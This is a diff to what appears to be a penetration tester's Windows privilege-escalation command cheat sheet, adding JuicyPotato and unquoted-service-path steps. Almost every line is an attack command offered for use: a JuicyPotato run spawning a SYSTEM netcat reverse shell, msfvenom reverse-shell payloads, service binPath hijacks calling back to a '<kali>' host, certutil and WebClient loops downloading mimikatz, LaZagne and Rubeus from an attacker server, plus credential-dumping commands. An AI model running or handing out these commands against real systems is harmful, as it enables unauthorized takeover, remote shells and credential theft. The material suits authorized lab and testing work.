@@ -229,6 +229,13 @@ icacls:icacls <filename1> /grant <user>:F # grant user full control (only if you
 icacls:icacls "<filename1>" # inspect ACLs to identify writable binaries/configs; target-machine
 icacls:icacls "." /grant Everyone:RX # make current dir readable/executable for all (staging/shared execution); target-machine
 Writable PATH Check:for %A in ("%PATH:;=" "%") do (@if exist "%~A" (@icacls "%~A" 2>nul | findstr /i "(F) (M) (W)" && echo [WRITABLE] %~A)) # find writable PATH directories for DLL hijacking; target-machine
+SeAssignPrimaryTokenPrivilege:whoami /priv | findstr SeAssignPrimaryTokenPrivilege # Check for SeAssignPrimaryTokenPrivilege privilege; target-machine
+SeAssignPrimaryTokenPrivilege:systeminfo #cmd.exe; target-machine
+SeAssignPrimaryTokenPrivilege:Get-ComputerInfo #pwsh; target-machine
+SeAssignPrimaryTokenPrivilege:check https://github.com/ohpe/juicy-potato/tree/master/CLSID/ 
+SeAssignPrimaryTokenPrivilege:upload /home/kali/Tools/windows/priv-esc/JuicyPotato.exe #upload JuicyPotato.exe to target via Evil-WinRM; target-machine
+SeAssignPrimaryTokenPrivilege:upload /home/kali/Tools/windows/priv-esc/nc64.exe #upload JuicyPotato.exe to target via Evil-WinRM; target-machine
+SeAssignPrimaryTokenPrivilege:.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\<user>\Documents\<filename1> -e cmd.exe <kali> <kaliPort>" -l <port> -c "{<CLSID of Winmgmt>}" #exploit JuicyPotato to spawn SYSTEM shell and execute reverse shell payload; target-machine
 SeImpersonate:whoami /priv | findstr SeImpersonate # Check for SeImpersonate privilege; target-machine
 SeImpersonate:FullPowers.exe -c "whoami" # Test FullPowers (restores full privileges) https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe; target-machine
 SeImpersonate:FullPowers.exe -c "C:\temp\nc64.exe -e cmd <kali> <kaliPort>" # Restore full privileges and execute reverse shell; target-machine
@@ -269,8 +276,12 @@ SeRestorePrivilege:whoami /priv | findstr SeRestore # Check for SeRestorePrivile
 SeRestorePrivilege:reg restore HKLM\SAM sam.save # Restore SAM hive if you have SeRestore; target-machine
 SeShutdownPrivilege:shutdown /r /t 0 # reboot host (useful after service/binpath changes); target-machine
 Unquoted Service Path:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f exe -o <service>.exe # Create malicious service binary; kali-machine
-Unquoted Service Path #2:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f exe -o <service>.exe #generate reverse shell payload named after target service; kali-machine
-Unquoted Service Path #2:#transfer generated payload to target machine (e.g., via SMB, HTTP, or certutil); kali-machine
+Unquoted Service Path:icacls <service_folder> # Check folder permissions for write access; target-machine
+Unquoted Service Path:wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """ # Find unquoted service paths manually; target-machine
+Unquoted Service Path:sc qc <service> # Check service configuration; target-machine
+Unquoted Service Path:sc stop <service> # Stop service before replacing binary; target-machine
+Unquoted Service Path:copy <service>.exe "<service_path>" # Replace service binary; target-machine
+Unquoted Service Path:sc start <service> # Start service to trigger payload; target-machine
 Unquoted Service Path #1:Import-Module .\PowerUp.ps1 #load PowerUp module for privilege escalation checks; target-machine
 Unquoted Service Path #1:Invoke-AllChecks #identify vulnerable services (look for "Unquoted Service Paths" findings); target-machine
 Unquoted Service Path #1:cmd.exe /c "sc qc <service>" #view service configuration and confirm unquoted binary path; target-machine
@@ -278,21 +289,18 @@ Unquoted Service Path #1:whoami /priv #verify privileges required to stop/start 
 Unquoted Service Path #1:icacls <service_folder> #verify current user has exploitable permissions such as (F) FullControl, (M) Modify, (W) Write, (WD) WriteData, (DC) DeleteChild, or inherited (OI)(CI)(M/F); target-machine
 Unquoted Service Path #1:icacls <service_binary_path> #verify write/modify/full control permissions on the executable itself; target-machine
 Unquoted Service Path #1:Get-WmiObject Win32_Service -Filter "Name='<service>'" | Select-Object Name, ProcessId, State, StartMode, PathName #enumerate service state and binary path; target-machine
-Unquoted Service Path:icacls <service_folder> # Check folder permissions for write access; target-machine
-Unquoted Service Path:wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """ # Find unquoted service paths manually; target-machine
-Unquoted Service Path:sc qc <service> # Check service configuration; target-machine
-Unquoted Service Path:sc stop <service> # Stop service before replacing binary; target-machine
-Unquoted Service Path:copy <service>.exe "<service_path>" # Replace service binary; target-machine
-Unquoted Service Path:sc start <service> # Start service to trigger payload; target-machine
 Unquoted Service Path #1:Write-ServiceBinary -ServiceName <service> -Path '<service_binary_path>' -UserName <user> -Password '<password>' #replace service binary to add specified user to Administrators group; target-machine
 Unquoted Service Path #1:sc.exe stop <service> #stop vulnerable service before restart; target-machine
 Unquoted Service Path #1:sc.exe query <service> #check current service status; target-machine
 Unquoted Service Path #1:sc.exe start <service> #start service to trigger malicious binary execution; target-machine
 Unquoted Service Path #1:net localgroup Administrators #verify if target user was added to Administrators group; target-machine
+Unquoted Service Path #1:xfreerdp3 /v:<target> /u:<user> /p:'<password>' /dynamic-resolution /clipboard #log in via RDP after privilege escalation; kali-machine
+Unquoted Service Path #2:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f exe -o <service>.exe #generate reverse shell payload named after target service; kali-machine
+Unquoted Service Path #2:#transfer generated payload to target machine (e.g., via SMB, HTTP, or certutil); kali-machine
 Unquoted Service Path #2:sc.exe config <service> binPath= "<payload_full_path>" #modify service binary path to point to malicious executable; target-machine
+Unquoted Service Path #2:sc.exe config <service> binPath= "cmd.exe /c C:/Users/<user>/<filename1> -e cmd.exe <kali> <kaliPort>" #modify service binary path to execute reverse shell payload for privilege escalation; target-machine
 Unquoted Service Path #2:sc.exe qc <service> #verify updated service configuration and binPath; target-machine
 Unquoted Service Path #2:sc.exe start <service> #start service to trigger execution of malicious payload; target-machine
-Unquoted Service Path #1:xfreerdp3 /v:<target> /u:<user> /p:'<password>' /dynamic-resolution /clipboard #log in via RDP after privilege escalation; kali-machine
 Unquoted Service Path #2:penelope <kaliPort> #start listener on Kali to catch reverse shell; kali-machine
 Server Operator Local Group Member and SeBackupPrivilege and SeRestorePrivilege:sc.exe config <service> binPath= "C:\Windows\Temp\nc64.exe -e cmd.exe <kali> <kaliPort>" # service binpath hijack to execute payload as service account; target-machine
 Server Operator Local Group Member and SeBackupPrivilege and SeRestorePrivilege:sc.exe stop <service> # stop service to apply changes; target-machine
@@ -339,9 +347,9 @@ LaZagne:.\laZagne.exe databases # Extract database passwords; target-machine
 LaZagne:.\laZagne.exe sysadmin # Extract system admin passwords; target-machine
 Browser Passwords:.\laZagne.exe browsers # Run LaZagne to extract browser passwords; target-machine
 Browser Passwords:python3 laZagne.py browsers # Python version; target-machine
-^Privesc Toolkit:powershell.exe -c "$u='http://<kali>:<kaliPort>/';'PrivescCheck.ps1','SharpHound.ps1','GodPotato-NET4.exe','nc64.exe','PrintSpoofer64.exe','SharpGPOAbuse.exe','LaZagne.exe','PowerUp.ps1','SeManageVolumeExploit.exe','winPEASany_ofs.exe','PowerView.ps1','Rubeus.exe','mimikatz.exe'|%{(New-Object Net.WebClient).DownloadFile($u+$_,$_)}" # Download complete privesc toolkit via WebClient; target-machine
-Privesc Toolkit:File Download:$u='http://<kali>:<kaliPort>/'; 'PrivescCheck.ps1','SharpHound.ps1','GodPotato-NET4.exe','nc64.exe','PrintSpoofer64.exe','SharpGPOAbuse.exe','LaZagne.exe','PowerUp.ps1','SeManageVolumeExploit.exe','winPEASany_ofs.exe','PowerView.ps1','Rubeus.exe','mimikatz.exe' | ForEach-Object {(New-Object Net.WebClient).DownloadFile($u+$_,$_)} #download multiple tools from attacker web server using PowerShell WebClient loop; target-machine
-Privesc Toolkit:cmd.exe /c "for %f in (GodPotato-NET4.exe SharpHound.ps1 nc64.exe PrintSpoofer64.exe SharpGPOAbuse.exe LaZagne.exe PowerUp.ps1 PrivescCheck.ps1 SeManageVolumeExploit.exe winPEASany_ofs.exe PowerView.ps1 Rubeus.exe mimikatz.exe) do certutil.exe -f -urlcache -split http://<kali>:<kaliPort>/%f %f" # Download toolkit with certutil when PowerShell restricted; target-machine
+^Privesc Toolkit:powershell.exe -c "$u='http://<kali>:<kaliPort>/';'PrivescCheck.ps1','JuicyPotato.exe','SharpHound.ps1','GodPotato-NET4.exe','nc64.exe','PrintSpoofer64.exe','SharpGPOAbuse.exe','LaZagne.exe','PowerUp.ps1','SeManageVolumeExploit.exe','winPEASany_ofs.exe','PowerView.ps1','Rubeus.exe','mimikatz.exe'|%{(New-Object Net.WebClient).DownloadFile($u+$_,$_)}" # Download complete privesc toolkit via WebClient; target-machine
+Privesc Toolkit:File Download:$u='http://<kali>:<kaliPort>/'; 'PrivescCheck.ps1','JuicyPotato.exe','SharpHound.ps1','GodPotato-NET4.exe','nc64.exe','PrintSpoofer64.exe','SharpGPOAbuse.exe','LaZagne.exe','PowerUp.ps1','SeManageVolumeExploit.exe','winPEASany_ofs.exe','PowerView.ps1','Rubeus.exe','mimikatz.exe' | ForEach-Object {(New-Object Net.WebClient).DownloadFile($u+$_,$_)} #download multiple tools from attacker web server using PowerShell WebClient loop; target-machine
+Privesc Toolkit:cmd.exe /c "for %f in (GodPotato-NET4.exe JuicyPotato.exe SharpHound.ps1 nc64.exe PrintSpoofer64.exe SharpGPOAbuse.exe LaZagne.exe PowerUp.ps1 PrivescCheck.ps1 SeManageVolumeExploit.exe winPEASany_ofs.exe PowerView.ps1 Rubeus.exe mimikatz.exe) do certutil.exe -f -urlcache -split http://<kali>:<kaliPort>/%f %f" # Download toolkit with certutil when PowerShell restricted; target-machine
 UAC Bypass:.\RunasCs.exe <user> <password> "whoami /priv" -domain <domain> -b #execute command as another domain user and enumerate privileges (check for SeDebugPrivilege) before attempting UAC bypass; target-machine
 UAC Bypass:.\RunasCs.exe <user> <password> "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit" -domain <domain> -b #execute command as another domain user using RunasCs with logon bypass to dump credentials via mimikatz; target-machine
 Run command as <user> using RunasCs:# copy /home/kali/Tools/git-tools/RunasCs/Invoke-RunasCs.ps1 to target-machine
@@ -361,7 +369,6 @@ PSCredential (Powershell)-fragile:$password = ConvertTo-SecureString "<password>
 PSCredential (Powershell)-fragile:$cred = New-Object System.Management.Automation.PSCredential("<user>", $password) # build PSCredential object; target-machine
 PSCredential (Powershell)-fragile:Enter-PSSession -ComputerName <target hostname> -Credential $cred # PowerShell remoting interactive session; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' --shares # List SMB shares; kali-machine
-NXC Enum:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --sessions # List active sessions; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' --users # List domain users; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' --loggedon-users # enumerate users currently logged on to the target via SMB; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' --groups # List domain groups; kali-machine
